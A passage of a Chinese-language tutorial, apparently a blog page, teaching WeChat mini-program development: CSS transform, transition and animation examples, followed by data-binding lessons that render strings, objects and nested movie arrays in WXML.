<span class="tag">&lt;<span class="name">image</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/luffy.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.blur-bg</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">750</span>rpx;<span class="attribute">height</span>: <span class="number">300</span>rpx;<span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/blurimg.jpg</span>);</span><br><span class="line">    <span class="attribute">background-size</span>: cover;</span><br><span class="line">    <span class="attribute">position</span>: fixed;</span><br><span class="line">    <span class="attribute">filter</span>: <span class="built_in">blur</span>(<span class="number">15px</span>);</span><br><span class="line">    <span class="attribute">z-index</span>: -<span class="number">1</span>;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.user-img</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">750</span>rpx;<span class="attribute">height</span>: <span class="number">300</span>rpx;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">justify-content</span>: center; </span><br><span class="line">    <span class="attribute">align-items</span>:center;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.user-img</span> image &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">80</span>rpx;<span class="attribute">height</span>: <span class="number">80</span>rpx;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x008-变形属性Transform"><a href="#0x008-变形属性Transform" class="headerlink" title="0x008 变形属性Transform"></a>0x008 变形属性Transform</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;transform-display&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span>缩放,scale(x,y)，x为长度缩放倍数，y为宽度缩放倍数，如果只有一个值，则是长和宽缩放的倍数<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;scale&quot;</span>  <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span>平移,translate(x,y)，x为x轴平移的距离，y为y轴平移的距离，如果只有一个值，则是x和y轴缩放的距离，值可以为负数<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;translate&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">view</span>&gt;</span>旋转,rotate()里的值为旋转的角度<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;rotate&quot;</span>  <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">view</span>&gt;</span>倾斜,skew()里的值为旋转的角度<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;skew&quot;</span>  <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.transform-display</span> image&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">80px</span>;<span class="attribute">height</span>: <span class="number">80px</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-class">.scale</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1</span>,<span class="number">0.5</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.translate</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">500px</span>,<span class="number">20px</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.rotate</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">45deg</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.skew</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">skew</span>(<span class="number">120deg</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x009-过渡属性Transition"><a href="#0x009-过渡属性Transition" class="headerlink" title="0x009 过渡属性Transition"></a>0x009 过渡属性Transition</h3><p><code>语法：transition: [transition-property] [transition-duration] [transition-timing-function] [transition-delay];&#125;</code></p><ul><li><strong>transition-property</strong>，应用过渡的 CSS 或动画属性的名称；</li><li><strong>transition-duration</strong>，整个过渡效果持续的时间，默认时间为0秒，所以要有过渡效果这个是必须定义的；</li><li><strong>transition-timing-function</strong>，规定过渡效果的时间曲线，默认为ease；</li><li><strong>transition-delay</strong>，过渡效果延迟多久，或者说何时开始，默认为0秒，不定义的话也就是直接开始；</li></ul><h3 id="0x010-背景颜色的变化"><a href="#0x010-背景颜色的变化" class="headerlink" title="0x010 背景颜色的变化"></a>0x010 背景颜色的变化</h3><p>  同样还是把下面的代码输入到小程序的页面当中，通过实战的方式来查看效果。</p><p>  使用开发者工具新建一个transition页面，然后在transition.wxml页面里面输入以下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;transition-display&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;box bg-color&quot;</span> <span class="attr">hover-class</span>=<span class="string">&quot;bg-color-hover&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="selector-class">.box</span>&#123;<span class="attribute">width</span>: <span class="number">150px</span>;<span class="attribute">height</span>: <span class="number">150px</span>;<span class="attribute">cursor</span>: pointer;&#125;</span><br><span class="line">  <span class="selector-class">.bg-color</span>&#123;</span><br><span class="line">      <span class="attribute">background-color</span>:green;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.bg-color-hover</span>&#123;</span><br><span class="line">      <span class="attribute">background-color</span>: yellow;</span><br><span class="line">      <span class="attribute">transition</span>: background-color <span class="number">5s</span> ease-out <span class="number">3s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  动画是需要触发的，这里我们使用的是<strong>悬停hover-class</strong>来触发效果，把鼠标放在元素上8秒以上，看一下正方形的背景颜色有什么变化。</p><p>  了解了效果之后，我们再来结合实际案例理解语法：</p><ul><li><p>因为我们是用hover来触发的，所以transition要写在元素的hover-class里，盒子之前的背景是绿色green，悬停的背景是黄色yellow；</p></li><li><p>因为我们改变的是盒子background-color，所以transition需要过渡的CSS属性名称，就是background-color；</p></li><li><p>动画过渡持续的时间，我们设置的是5秒，也就是背景由绿色变为黄色的时间；</p></li><li><p>这里的ease-out（慢速结束）是颜色过渡的时间曲线效果。还可以有linear（匀速）、ease-in（慢速开始）、ease-in-out（慢速开始和慢速结束）。持续的时间很短的情况下，这几个时间曲线效果差别是及其细微的，<strong>需要设计师对动画足够敏感了</strong>。</p></li><li><p>动画延迟的时间是3秒，也就是说3秒之后动画才开始。</p><p>一个综合案例，在transition.wxml里输入</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">view</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">text</span>&gt;</span>盒子的多个属性一起动画: width, height, background-color, transform. 将鼠标或手指悬停在盒子上查看动画之后放开。<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;animatebox&quot;</span> <span class="attr">hover-class</span>=<span class="string">&quot;animatebox-hover&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>  在transition.wxss里输入</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  <span class="selector-class">.animatebox</span> &#123;</span><br><span class="line">      <span class="attribute">display</span>: block;</span><br><span class="line">      <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">      <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">      <span class="attribute">background-color</span>: <span class="number">#4a9d64</span>;</span><br><span class="line">      <span class="attribute">transition</span>:width <span class="number">2s</span>, height <span class="number">2s</span>, background-color <span class="number">2s</span>, transform <span class="number">2s</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.animatebox-hover</span> &#123;</span><br><span class="line">      <span class="attribute">background-color</span>: <span class="number">#cd584a</span>;</span><br><span class="line">      <span class="attribute">width</span>:<span class="number">200px</span>;</span><br><span class="line">      <span class="attribute">height</span>:<span class="number">200px</span>;</span><br><span class="line">      <span class="attribute">transform</span>:<span class="built_in">rotate</span>(<span class="number">180deg</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x011-动画属性Animation"><a href="#0x011-动画属性Animation" class="headerlink" title="0x011 动画属性Animation"></a>0x011 动画属性Animation</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;fadeIn&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">view</span>&gt;</span>注意会有一个无限颜色渐变变化的动画<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://hackwork-1251009918.cos.ap-shanghai.myqcloud.com/handbook/html5/weapp.jpg&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@keyframes</span> fadeIn &#123;</span><br><span class="line">  <span class="selector-tag">from</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="selector-tag">to</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="selector-class">.fadeIn</span> &#123;</span><br><span class="line">  <span class="attribute">animation</span>: <span class="number">4s</span> linear <span class="number">0s</span> infinite alternate fadeIn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x05-数据绑定"><a href="#0x05-数据绑定" class="headerlink" title="0x05 数据绑定"></a>0x05 数据绑定</h2><h3 id="0x001-数据分离"><a href="#0x001-数据分离" class="headerlink" title="0x001 数据分离"></a>0x001 数据分离</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>&#123;&#123;username&#125;&#125;，您已登录，欢迎<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在js的data里面插入:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>:&#123;</span><br><span class="line"> <span class="attr">username</span>:<span class="string">&quot;xx&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>data 是小程序的页面第一次渲染使用的<strong>初始数据</strong>。小程序的页面加载时， data 将会以 JSON字符串的形式由逻辑层传至渲染层，因此 data中的数据必须是可以转成 JSON的类型：字符串String，数字Number，布尔值Boolean，对象Object，数组Array。</p><h3 id="0x002-数据类型"><a href="#0x002-数据类型" class="headerlink" title="0x002 数据类型"></a>0x002 数据类型</h3><p>通过前面的案例我们了解到WXML 中的动态数据均来自对应 Page 的 data。 data 是小程序的页面第一次渲染使用的<strong>初始数据</strong>。小程序的页面加载时， data 将会以 JSON字符串的形式由逻辑层传至渲染层，因此 data中的数据必须是可以转成 JSON的类型：字符串String，数字Number，布尔值Boolean，对象Object，数组Array。</p><ul><li><strong>字符串String</strong>，用于存储和处理文本，可以结合Excel单元格格式里的文本格式来理解；</li><li><strong>数字Number</strong>，这个很好理解，比如233这个数，它的数字格式和文本格式是有很大不同的，学Excel一定不会陌生；</li><li><strong>布尔值Boolean</strong>，就是true和false，虽然只有两个值，但是它代表着两种选择，两种不同的条件，两种不同的结果；</li><li><strong>对象Object</strong>，结合之前所学，我们再来回顾一下：对象由大括号{}分隔，在大括号{}内部，对象的属性以名称和值对的形式 name : value来定义，属性由逗号,分隔</li><li><strong>数组Array</strong>，结合之前所学，我们再来回顾一下：数组由中括号[ ]来分割，有点类似于列表；</li></ul><h3 id="0x003-组件属性的渲染"><a href="#0x003-组件属性的渲染" class="headerlink" title="0x003 组件属性的渲染"></a>0x003 组件属性的渲染</h3><p>通过数据绑定，我们还可以把 style、class 、id等属性分离出来来控制组件的样式等信息。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">navigator</span> <span class="attr">id</span>=<span class="string">&quot;item-&#123;&#123;id&#125;&#125;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;&#123;&#123;itemclass&#125;&#125;&quot;</span> <span class="attr">url</span>=<span class="string">&quot;&#123;&#123;itemurl&#125;&#125;&quot;</span> &gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">image</span> <span class="attr">style</span>=<span class="string">&quot;width: &#123;&#123;imagewidth&#125;&#125;&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;&#123;&#123;imagemode&#125;&#125;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;imagesrc&#125;&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">navigator</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="number">233</span>,</span><br><span class="line">  <span class="attr">itemurl</span>:<span class="string">&quot;/pages/home/imgshow/imgshow&quot;</span>,</span><br><span class="line">  <span class="attr">itemclass</span>:<span class="string">&quot;event-item&quot;</span>,</span><br><span class="line">  <span class="attr">imagesrc</span>: <span class="string">&quot;https://hackwork.oss-cn-shanghai.aliyuncs.com/lesson/weapp/4/weapp.jpg&quot;</span>,</span><br><span class="line">  <span class="attr">imagemode</span>:<span class="string">&quot;widthFix&quot;</span>,</span><br><span class="line">  <span class="attr">imagewidth</span>:<span class="string">&quot;100%&quot;</span>,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>在模拟器里查看显示的效果，发现显示的结果上和之前不采用数据绑定没有什么区别，<em><strong>但是用数据绑定的好处是为我们以后添加大量数据以及进行编程更新打下了基础。</strong></em></p><h3 id="0x004-渲染数组里的单条数据"><a href="#0x004-渲染数组里的单条数据" class="headerlink" title="0x004 渲染数组里的单条数据"></a>0x004 渲染数组里的单条数据</h3><p>格式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>&#123;&#123;newstitle[0]&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line">   <span class="attr">newstitle</span>:[</span><br><span class="line">     </span><br><span class="line">   ],</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="0x005-渲染对象类型的数据"><a href="#0x005-渲染对象类型的数据" class="headerlink" title="0x005 渲染对象类型的数据"></a>0x005 渲染对象类型的数据</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;movie.img&#125;&#125;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:300rpx&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>电影名：&#123;&#123;movie.name&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>英文名：&#123;&#123;movie.englishname&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>国家：&#123;&#123;movie.country&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>发行年份：&#123;&#123;movie.year&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>简述：&#123;&#123;movie.desc&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">movie</span>: &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;肖申克的救赎&quot;</span>,</span><br><span class="line">      <span class="attr">englishname</span>:<span class="string">&quot;The Shawshank Redemption&quot;</span>,</span><br><span class="line">      <span class="attr">country</span>:<span class="string">&quot;美国&quot;</span>,</span><br><span class="line">      <span class="attr">year</span>:<span class="number">1994</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p480747492.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;有的人的羽翼是如此光辉，即使世界上最黑暗的牢狱，也无法长久地将他围困！&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象Object类型的数据就被渲染出来:在双大括号&#123;&#123;&#125;&#125;里，输入变量movie+点+属性名即可，这就是**对象的点表示法**。</span><br></pre></td></tr></table></figure><h3 id="0x006-复杂的数据嵌套"><a href="#0x006-复杂的数据嵌套" class="headerlink" title="0x006 复杂的数据嵌套"></a>0x006 复杂的数据嵌套</h3><p>对象是可以嵌套的，也就是一个对象可以作为另外一个对象的值，除了对象里套对象，数组里也可以套对象，对象里也可以套数组。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">movies</span>:[</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="attr">name</span>: <span class="string">&quot;肖申克的救赎&quot;</span>,</span><br><span class="line">       <span class="attr">englishname</span>: <span class="string">&quot;The Shawshank Redemption&quot;</span>,</span><br><span class="line">       <span class="attr">country</span>: <span class="string">&quot;美国&quot;</span>,</span><br><span class="line">       <span class="attr">year</span>: <span class="number">1994</span>,</span><br><span class="line">       <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p480747492.webp&quot;</span>,</span><br><span class="line">       <span class="attr">desc</span>: <span class="string">&quot;有的人的羽翼是如此光辉，即使世界上最黑暗的牢狱，也无法长久地将他围困！&quot;</span>,</span><br><span class="line">       <span class="attr">actor</span>:[</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="attr">name</span>:<span class="string">&quot;蒂姆·罗宾斯&quot;</span>,</span><br><span class="line">           <span class="attr">role</span>:<span class="string">&quot;安迪·杜佛兰&quot;</span></span><br><span class="line">         &#125;,</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="attr">name</span>:<span class="string">&quot;摩根·弗里曼&quot;</span>,</span><br><span class="line">           <span class="attr">role</span>:<span class="string">&quot;艾利斯·波伊德·瑞德&quot;</span></span><br><span class="line">         &#125;,</span><br><span class="line">       ]</span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="attr">name</span>: <span class="string">&quot;霸王别姬&quot;</span>,</span><br><span class="line">       <span class="attr">englishname</span>: <span class="string">&quot;Farewell My Concubine&quot;</span>,</span><br><span class="line">       <span class="attr">country</span>: <span class="string">&quot;中国&quot;</span>,</span><br><span class="line">       <span class="attr">year</span>: <span class="number">1993</span>,</span><br><span class="line">       <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p2561716440.webp&quot;</span>,</span><br><span class="line">       <span class="attr">desc</span>: <span class="string">&quot;风华绝代&quot;</span>,</span><br><span class="line">       <span class="attr">actor</span>: [</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="attr">name</span>: <span class="string">&quot;张国荣&quot;</span>,</span><br><span class="line">           <span class="attr">role</span>: <span class="string">&quot;程蝶衣&quot;</span></span><br><span class="line">         &#125;,</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="attr">name</span>: <span class="string">&quot;张丰毅&quot;</span>,</span><br><span class="line">           <span class="attr">role</span>: <span class="string">&quot;段小楼&quot;</span></span><br><span class="line">         &#125;,</span><br><span class="line">       ]</span><br><span class="line">     &#125;,</span><br><span class="line">   ],</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>豆瓣电影排名第2、最重要的主演演员名：<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>&#123;&#123;movies[1].actor[0].name&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>显示即可出现我们想要的结果</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;movies[1].img&#125;&#125;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:300rpx&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>电影名：&#123;&#123;movies[1].name&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>英文名：&#123;&#123;movies[1].englishname&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>发行地：&#123;&#123;movies[1].country&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>发行年份：&#123;&#123;movies[1].year&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>简述：&#123;&#123;movies[1].desc&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将第二部电影的数据全部渲染</p><p>以上适用于电影或者新闻列表渲染</p><h2 id="0x06-列表渲染与条件渲染"><a href="#0x06-列表渲染与条件渲染" class="headerlink" title="0x06 列表渲染与条件渲染"></a>0x06 列表渲染与条件渲染</h2><h3 id="0x001-渲染数组里的所有数据"><a 